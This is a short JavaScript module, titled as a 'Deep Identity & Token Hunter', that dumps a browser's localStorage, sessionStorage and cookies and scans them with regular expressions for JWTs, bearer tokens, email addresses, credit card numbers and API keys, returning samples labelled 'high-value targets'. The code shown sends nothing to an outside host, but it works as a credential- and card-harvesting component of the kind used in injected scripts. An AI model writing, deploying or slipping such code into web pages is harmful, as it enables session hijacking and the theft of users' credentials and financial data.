/**
 * Pinpoint Core: Deep Identity & Token Hunter
 * 
 * Professional-grade PII extraction logic targeting credentials and tokens.
 */

const PATTERNS = {
    jwt: /eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*/g,
    bearer: /Bearer\s+[A-Za-z0-9-._~+/]+=*/gi,
    email: /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/gi,
    credit_card: /\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})\b/g,
    api_key: /(?:key|api|token|secret|pass|auth)[_-]?[a-z0-9]{16,}/gi
};

export const extractBrowserStorage = () => {
    return {
        localStorage: { ...localStorage },
        sessionStorage: { ...sessionStorage },
        cookies: document.cookie
    };
};

/**
 * Performs a deep audit of stored data to find high-value targets.
 */
export const auditIdentityMarkers = () => {
    const rawData = JSON.stringify(extractBrowserStorage());
    const findings = {};

    for (const [key, regex] of Object.entries(PATTERNS)) {
        const matches = rawData.match(regex);
        if (matches) {
            findings[key] = {
                count: matches.length,
                samples: [...new Set(matches)].slice(0, 3) // Only show first 3 unique samples
            };
        }
    }

    return Object.keys(findings).length > 0 ? findings : "NO_HIGH_VALUE_PATTERNS_DETECTED";
};
